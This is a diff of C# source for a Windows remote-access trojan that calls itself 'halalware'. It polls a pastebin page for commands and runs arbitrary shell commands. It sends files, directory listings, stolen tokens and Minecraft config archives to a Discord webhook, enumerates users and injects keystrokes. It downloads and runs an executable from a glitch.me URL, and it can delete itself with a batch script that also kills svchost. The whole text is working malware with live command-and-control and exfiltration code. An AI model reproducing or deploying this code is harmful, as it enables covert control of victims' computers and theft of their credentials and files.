@@ -16,6 +16,18 @@ using System.Management;
 using static Tools;
 using System.Reflection.Metadata;
 using System.IO.Compression;
+using WindowsInput;
+using Microsoft.Win32;
+using System.Reflection;
+using System.Windows.Forms;
+
+/*/
+ * 
+ * 埋め込みディレクトリを変更
+ * IDをhash化　=> C:\ProgramData\{ID-hashed}
+ * public string MainDir = "C:\ProgramData\{ID-hashed}";
+ * 
+/*/
 
 public static class Tools
 {
@@ -162,26 +174,61 @@ public static class Tools
 }
 public class run_cmd
 {
+    public string MainDir = "";
     public string command = "";
     public string temp = "";
     public bool end_cmd = false;
     public bool first_cmd = true;
-    public string webhook_scr = "WEB HOOK 1";
-    public string webhook_log = "WEB HOOK 2";
+    public string webhook_scr = "WEBHOOK1";
+    public string webhook_log = "WEBHOOK2";
     public void start()
     {
-        System.Timers.Timer timer = new System.Timers.Timer(15000);
+        byte[] bytes = Encoding.UTF8.GetBytes(get_id());
+        using (SHA256 sha256 = SHA256.Create())
+        {
+            // ハッシュを計算
+            byte[] hashBytes = sha256.ComputeHash(bytes);
+
+            // バイト配列を16進数文字列に変換
+            StringBuilder builder = new StringBuilder();
+            foreach (byte b in hashBytes)
+            {
+                builder.Append(b.ToString("x2")); // 2桁の16進数で表示
+            }
+
+            string hashValue = builder.ToString();
+            Console.WriteLine("SHA-256ハッシュ値: " + hashValue);
+            MainDir = @"C:\ProgramData\{" + hashValue + "}";
+        }
+        SystemEvents.PowerModeChanged += sleep;
+        System.Timers.Timer timer = new System.Timers.Timer(10 * 1000);
         timer.Elapsed += (sender, e) =>
         {
             check_command();
             png_delete();
         };
         timer.Start();
-        Tools.Wait();
+        Wait();
+    }
+    public void sleep(object sender, PowerModeChangedEventArgs e)
+    {
+        switch (e.Mode)
+        {
+            case PowerModes.Suspend:
+                send_log("PCがスリープ状態に入りました。");
+                break;
+            case PowerModes.Resume:
+                send_log("PCがスリープ状態から復帰しました。");
+                break;
+        }
     }
     public string get_id()
     {
-        return File.ReadAllText(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\ID.ini");
+        using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("US-MAIN"))
+        {
+            object value = key.GetValue("ID");
+            return value.ToString();
+        }
     }
     private bool FileEncrypt(string FilePath, string Password, string filename)
     {
@@ -244,8 +291,6 @@ public class run_cmd
 
         if (String.Compare(Path.GetExtension(FilePath), Path.GetExtension(FilePath), true) != 0)
         {
-            //The file are not encrypted file! Decryption failed
-
             return (false); ;
         }
 
@@ -297,43 +342,52 @@ public class run_cmd
     }
     private void png_delete()
     {
-        if (File.Exists("C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\file.png"))
+        if (File.Exists(MainDir + @"\file.png"))
         {
-            File.Delete("C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\file.png");
+            File.Delete(MainDir+@"\file.png");
         }
     }
-    public void send_log(string content)
+    public async void send_log(string content)
     {
         try
         {
-            HttpClient httpClient = new HttpClient();
-            Dictionary<string, string> strs = new Dictionary<string, string>()
-        {
-            { "content", content },
-            { "username", "halalware (id:" + get_id() + ")" },
-            { "avatar_url", "https://cdn.discordapp.com/avatars/1132757640867491871/acad78f5bbc5f777975cdd7e1fda249c.webp?size=160" }
-        };
-            TaskAwaiter<HttpResponseMessage> awaiter = httpClient.PostAsync(webhook_log, new
-            FormUrlEncodedContent(strs)).GetAwaiter();
-            awaiter.GetResult();
+            if (content.Length <= 2000)
+            {
+
+                HttpClient httpClient = new HttpClient();
+                Dictionary<string, string> strs = new Dictionary<string, string>()
+                {
+                    { "content", content },
+                    { "username", "halalware (id:" + get_id() + ")" },
+                    { "avatar_url", "https://cdn.discordapp.com/avatars/1132757640867491871/acad78f5bbc5f777975cdd7e1fda249c.webp?size=160" }
+                };
+                TaskAwaiter<HttpResponseMessage> awaiter = httpClient.PostAsync(webhook_log, new FormUrlEncodedContent(strs)).GetAwaiter();
+                awaiter.GetResult();
+                Console.WriteLine("送信された(無事)");
+            }
+            else
+            {
+                using (var con = new MultipartFormDataContent())
+                {
+                    string fp = @"C:\Windows\Temp\CONTENT.txt";
+                    File.WriteAllText(fp, content);
+                    HttpClient client = new HttpClient();
+                    byte[] fileBytes = File.ReadAllBytes(fp);
+                    con.Add(new ByteArrayContent(fileBytes), "txt", Path.GetFileName(fp));
+                    con.Add(new StringContent("file upload (id:" +get_id() + ")"), "username");
+                    HttpResponseMessage response = await client.PostAsync(webhook_log, con);
+                    string responseContent = await response.Content.ReadAsStringAsync();
+                }
+            }
         }
-        catch
+        catch (Exception ex)
         {
-            HttpClient httpClient = new HttpClient();
-            Dictionary<string, string> strs = new Dictionary<string, string>()
-        {
-            { "content", "text over" },
-            { "username", "halalware (id:" + get_id() + ")" },
-            { "avatar_url", "https://cdn.discordapp.com/avatars/1132757640867491871/acad78f5bbc5f777975cdd7e1fda249c.webp?size=160" }
-        };
-            TaskAwaiter<HttpResponseMessage> awaiter = httpClient.PostAsync(webhook_log, new
-            FormUrlEncodedContent(strs)).GetAwaiter();
-            awaiter.GetResult();
+            Console.WriteLine("エラー："+ex.Message);
         }
     }
     public void check_command()
     {
-        string url = "https://pastebin.com/raw/{pastebin note ID}";
+        string url = "https://pastebin.com/raw/wjGKGNKL";
         using (WebClient client = new WebClient())
         {
             try
@@ -343,6 +397,7 @@ public class run_cmd
                 {
                     response = response.Replace(get_id()+":","");
                     response = response.Replace("ALL:", "");
+                    response = response.Replace("{MainDir}",MainDir);
                     if (response.Contains("cmd:"))
                     {
                         command = response.Replace("cmd:", "");
@@ -369,9 +424,17 @@ public class run_cmd
                         command = response;
                         get_tokens();
                     }
+                    else if (response.Contains("update:"))
+                    {
+                        update();
+                    }
+                    else if (response.Contains("make:"))
+                    {
+                        string module = response.Replace("make:", "");
+                        make(module);
+                    }
                     else if (response.Contains("dir:"))
                     {
-
                         string dir_path = response.Replace("dir:", "");
                         get_directory(dir_path);
                     }
@@ -380,17 +443,20 @@ public class run_cmd
                         string dir_path = response.Replace("file:", "");
                         get_files(dir_path);
                     }
-                    else if (response.Contains("crypt:"))
+                    else if (response.Contains("sendkey:"))
                     {
-
+                        command = response;
+                        keyhook(response.Replace("sendkey:",""));
                     }
-                    else if (response.Contains("decrypt:"))
+                    else if (response.Contains("user:"))
                     {
-
+                        command = response;
+                        U_list();
                     }
-                    else if (response.Contains("update:"))
+                    else if (response.Contains("config:"))
                     {
-                        update();
+                        command = response;
+                        Config_stealer();
                     }
                     else if (response.Contains("end:"))
                     {
@@ -409,17 +475,77 @@ public class run_cmd
             }
         }
     }
+    public void make(string mod)
+    {
+        if (command == temp)
+        {
+            Console.WriteLine("変化なし");
+        }
+        else
+        {
+            temp = command;
+            if (mod.Contains("file:"))
+            {
+                string F = mod.Replace("file:", "");
+                string[] L = mod.Split('\n');
+                File.WriteAllText(L[0], mod.Replace(L[0],""));
+                send_log("ファイルを作成しました\npath:" + F);
+            }
+            else if (mod.Contains("dir:"))
+            {
+                string D = mod.Replace("dir:","");
+                Directory.CreateDirectory(D);
+                send_log("ディレクトリを作成しました\npath:"+D);
+            }
+            else
+            {
+                send_log("無効なオプションです");
+            }
+        }
+    }
+    public void U_list()
+    {
+        string us = "";
+        if (command == temp)
+        {
+            Console.WriteLine("変化なし");
+        }
+        else
+        {
+            temp = command;
+            DirectoryInfo di = new DirectoryInfo(@"C:\Users");
+            DirectoryInfo[] diAlls = di.GetDirectories();
+            foreach (DirectoryInfo d in diAlls)
+            {
+                us += d.FullName.Replace("C:\\Users","")+"\n";
+            }
+            send_log("Users\n"+us);
+        }
+    }
     public void update()
     {
+        send_log("アップデートを開始");
+        using (WebClient client = new WebClient())
+        {
+            client.DownloadFile("https://cdn.glitch.me/94d05571-a823-41ab-8746-b9abf3c4b977/update.exe?v=1692857938255", "C:\\Windows\\Temp\\update.exe");
+        }
+        send_log("アップデート終了\nソフトを再起動します");
+        Process.Start("C:\\Windows\\Temp\\update.exe");
         Environment.Exit(0);
     }
-    public void crypt()
+    public void keyhook(string text)
     {
-
-    }
-    public void decrypt()
-    {
-
+        if (command == temp)
+        {
+            Console.WriteLine("変化なし");
+        }
+        else
+        {
+            temp = command;
+            Process.Start("notepad");
+            Thread.Sleep(500);
+            SendKeys.SendWait(text);
+        }
     }
     public async void get_files(string dirpath)
     {
@@ -427,34 +553,40 @@ public class run_cmd
         if (dirpath == temp)
         {
             Console.WriteLine("変化なし");
-            goto skip;
         }
         else
         {
             temp = dirpath;
-        }
-        string[] filepaths = Directory.GetFiles(dirpath, "*", SearchOption.AllDirectories);
-        foreach (string L in filepaths)
-        {
-            dir_list += L + "\n";
-        }
-        File.WriteAllText(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt", dir_list);
-        try
-        {
-            using (var content = new MultipartFormDataContent())
+            try
             {
-                HttpClient client = new HttpClient();
-                byte[] fileBytes = File.ReadAllBytes(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt");
-                content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt"));
-                HttpResponseMessage response = await client.PostAsync(webhook_log, content);
-                string responseContent = await response.Content.ReadAsStringAsync();
+                string[] filepaths = Directory.GetFiles(dirpath, "*", SearchOption.AllDirectories);
+                foreach (string L in filepaths)
+                {
+                    dir_list += L + "\n";
+                }
+                File.WriteAllText(MainDir+@"\Directory-list.txt", dir_list);
+            }
+            catch
+            {
+                send_log("upload error");
+            }
+            try
+            {
+                using (var content = new MultipartFormDataContent())
+                {
+                    HttpClient client = new HttpClient();
+                    byte[] fileBytes = File.ReadAllBytes(MainDir+@"\Directory-list.txt");
+                    content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(MainDir+@"\Directory-list.txt"));
+                    content.Add(new StringContent("file upload (id:" + get_id() + ")"), "username");
+                    HttpResponseMessage response = await client.PostAsync(webhook_log, content);
+                    string responseContent = await response.Content.ReadAsStringAsync();
+                }
+            }
+            catch
+            {
+                send_log("upload error");
             }
         }
-        catch
-        {
-            send_log("upload error");
-        }
-    skip:;
     }
     public async void get_directory(string dirpath)
     {
@@ -462,87 +594,132 @@ public class run_cmd
         if (dirpath == temp)
         {
             Console.WriteLine("変化なし");
-            goto skip;
         }
         else
         {
             temp = dirpath;
-        }
-        DirectoryInfo di = new DirectoryInfo(dirpath);
-        DirectoryInfo[] diAlls = di.GetDirectories();
-        foreach (DirectoryInfo d in diAlls)
-        {
-            dir_list += $"{d.FullName}\n";
-        }
-        DirectoryInfo[] diOptions = di.GetDirectories("*", SearchOption.AllDirectories);
-        foreach (DirectoryInfo d in diOptions)
-        {
-            dir_list += $"{d.FullName}\n";
-        }
-        File.WriteAllText(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt", dir_list);
-        try
-        {
-            using (var content = new MultipartFormDataContent())
+            try
             {
-                HttpClient client = new HttpClient();
-                byte[] fileBytes = File.ReadAllBytes(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt");
-                content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt"));
-                HttpResponseMessage response = await client.PostAsync(webhook_log, content);
-                string responseContent = await response.Content.ReadAsStringAsync();
+                DirectoryInfo di = new DirectoryInfo(dirpath);
+                DirectoryInfo[] diAlls = di.GetDirectories();
+                foreach (DirectoryInfo d in diAlls)
+                {
+                    dir_list += $"{d.FullName}\n";
+                }
+                File.WriteAllText(MainDir + @"\Directory-list.txt", dir_list);
+            }
+            catch
+            {
+                send_log("upload error");
+            }
+            try
+            {
+                using (var content = new MultipartFormDataContent())
+                {
+                    HttpClient client = new HttpClient();
+                    byte[] fileBytes = File.ReadAllBytes(MainDir + @"\Directory-list.txt");
+                    content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(MainDir + @"\Directory-list.txt"));
+                    content.Add(new StringContent("file upload (id:" + get_id() + ")"), "username");
+                    HttpResponseMessage response = await client.PostAsync(webhook_log, content);
+                    string responseContent = await response.Content.ReadAsStringAsync();
+                }
+            }
+            catch
+            {
+                send_log("upload error");
             }
         }
-        catch
+    }
+    public async void File_uplaod(string filepath, string extension)
+    {
+        if (filepath == temp)
         {
-            send_log("upload error");
+            Console.WriteLine("変化なし");
         }
-    skip:;
+        else
+        {
+            temp = filepath;
+            using (var content = new MultipartFormDataContent())
+            {
+                try
+                {
+                    HttpClient client = new HttpClient();
+                    byte[] fileBytes = File.ReadAllBytes(filepath);
+                    content.Add(new ByteArrayContent(fileBytes), extension, Path.GetFileName(filepath));
+                    content.Add(new StringContent("file upload (id:" + get_id() + ")"), "username");
+                    HttpResponseMessage response = await client.PostAsync(webhook_log, content);
+                    string responseContent = await response.Content.ReadAsStringAsync();
+                }
+                catch (Exception ex)
+                {
+                    send_log(ex.Message);
+                }
+            }
+        }
+    }
+    public void Config_stealer()
+    {
+        if (command == temp)
+        {
+            Console.WriteLine("変化なし");
+        }
+        else
+        {
+            temp = command;
+            ZipFile.CreateFromDirectory(Environment.SpecialFolder.LocalApplicationData+ @"\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\RoamingState", @"C:\Windows\Temp\Minecraft-Config.zip");
+            File_uplaod(@"C:\Windows\Temp\Minecraft-Config.zip", "file");
+            File.Delete(@"C:\Windows\Temp\Minecraft-Config.zip");
+        }
     }
     public void get_tokens()
     {
         if (command == temp)
         {
             Console.WriteLine("変化なし");
-            goto skip;
         }
         else
         {
             temp = command;
+            Engine engine = new Engine();
+            engine.Run();
+            send_log("tokens\n" + engine.tempdata);
         }
-        Engine engine = new Engine();
-        engine.Run();
-        send_log("tokens\n" + engine.tempdata);
-        skip:;
     }
     public async void upload(string filepath)
     {
         if (filepath == temp)
         {
             Console.WriteLine("変化なし");
-            goto skip;
         }
         else
         {
             temp = filepath;
+            using (var content = new MultipartFormDataContent())
+            {
+                try
+                {
+                    HttpClient client = new HttpClient();
+                    byte[] fileBytes = File.ReadAllBytes(filepath);
+                    content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(filepath));
+                    content.Add(new StringContent("file upload (id:" + get_id() + ")"), "username");
+                    HttpResponseMessage response = await client.PostAsync(webhook_log, content);
+                    string responseContent = await response.Content.ReadAsStringAsync();
+                }
+                catch (Exception ex)
+                {
+                    send_log(ex.Message);
+                }
+            }
         }
-        using (var content = new MultipartFormDataContent())
-        {
-            HttpClient client = new HttpClient();
-            byte[] fileBytes = File.ReadAllBytes(filepath);
-            content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(filepath));
-            content.Add(new StringContent("file upload (id:" + File.ReadAllText(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\ID.ini") + ")"), "username");
-            HttpResponseMessage response = await client.PostAsync(webhook_log, content);
-            string responseContent = await response.Content.ReadAsStringAsync();
-        }
-        skip:;
     }
     public void suicide()
     {
-        File.WriteAllText(@"C:\Windows\Temp\temp.bat", "taskkill /f /t /im shot.txt\r\ntaskkill /f /t /im interval.txt\r\ntimeout /t 5\r\nrd /s /q C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}");
+        File.WriteAllText(@"C:\Windows\Temp\temp.bat", "taskkill /f /t /im shot.txt\r\ntaskkill /f /t /im svchost.exe\r\ntimeout /t 5\r\nrd /s /q "+MainDir);
         ProcessStartInfo psInfo = new ProcessStartInfo();
         psInfo.FileName = "C:\\Windows\\Temp\\temp.bat";
         psInfo.CreateNoWindow = true;
         psInfo.UseShellExecute = false;
-        Process p = Process.Start(psInfo);
+        Process.Start(psInfo);
         send_log("自己削除完了");
         Environment.Exit(0);
     }
@@ -551,45 +728,110 @@ public class run_cmd
         if (command == temp)
         {
             Console.WriteLine("変化なし");
-            goto skip;
         }
         else
         {
             temp = command;
+            ProcessStartInfo psInfo = new ProcessStartInfo();
+            psInfo.FileName = "cmd";
+            psInfo.Arguments = "/c start "+MainDir+@"\shot.txt";
+            psInfo.CreateNoWindow = true;
+            psInfo.UseShellExecute = false;
+            Process.Start(psInfo);
         }
-        ProcessStartInfo psInfo = new ProcessStartInfo();
-        psInfo.FileName = "cmd";
-        psInfo.Arguments = "/c start C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\shot.txt";
-        psInfo.CreateNoWindow = true;
-        psInfo.UseShellExecute = false;
-        Process p = Process.Start(psInfo);
-        skip:;
     }
     public async void cmd()
     {
         if (command == temp)
         {
             Console.WriteLine("変化なし");
-            goto skip;
         }
         else
         {
             temp = command;
+            string log = "";
+
+            // ProcessStartInfo オブジェクトを設定
+            ProcessStartInfo psi = new ProcessStartInfo()
+            {
+                FileName = "cmd",
+                Arguments = "/c " + command.Replace("cmd:", ""),
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            // 外部プログラムを実行
+            using (Process process = new Process())
+            {
+                try
+                {
+                    process.StartInfo = psi;
+
+                    // タイムアウト設定（ミリ秒単位）
+                    int timeoutMilliseconds = 30 * 1000; // 5秒
+
+                    // タイムアウト用のタイマーを作成
+                    System.Timers.Timer timeoutTimer = new System.Timers.Timer();
+                    timeoutTimer.Interval = timeoutMilliseconds;
+                    timeoutTimer.Elapsed += (sender, e) =>
+                    {
+                        // タイムアウト時の処理
+                        Console.WriteLine("タイムアウトしました。プロセスを終了します。");
+
+                        // プロセスを強制的に終了
+                        if (!process.HasExited)
+                        {
+                            process.Kill();
+                        }
+
+                        timeoutTimer.Stop();
+                        timeoutTimer.Dispose();
+                    };
+                    timeoutTimer.Start();
+
+                    // プロセスの終了を待機（非同期）
+                    Task<int> processTask = Task.Run(() =>
+                    {
+                        process.Start();
+                        process.WaitForExit();
+                        return process.ExitCode;
+                    });
+
+                    // プロセスの終了コードを取得（非同期）
+                    int exitCode = await processTask;
+
+                    // タイムアウトタイマーを停止および解放
+                    timeoutTimer.Stop();
+                    timeoutTimer.Dispose();
+
+                    // 標準出力と標準エラー出力を読み取ります（必要に応じて）
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+                    /*
+                    Console.WriteLine($"終了コード: {exitCode}");
+                    Console.WriteLine("標準出力:");
+                    Console.WriteLine(output);
+                    Console.WriteLine("標準エラー出力:");
+                    Console.WriteLine(error);
+                    */
+                    log = $"```終了コード: {exitCode}\n標準出力: {output}\n標準エラー出力: {error}```";
+                    Console.WriteLine(log);
+                    send_log("コマンドを実行しました\n" + command + "\n" + log);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                }
+            }
         }
-        ProcessStartInfo psInfo = new ProcessStartInfo();
-        psInfo.FileName = "cmd";
-        psInfo.Arguments = "/c " + command.Replace("cmd:", "");
-        psInfo.CreateNoWindow = true;
-        psInfo.UseShellExecute = false;
-        Process p = Process.Start(psInfo);
-        send_log("コマンドを実行しました\n/c "+command);
-        skip:;
     }
 }
 
 public class Program
 {
-    public static async Task Main(string[] args)
+    public static void Main(string[] args)
     {
         run_cmd run_Cmd = new run_cmd();
         run_Cmd.start();
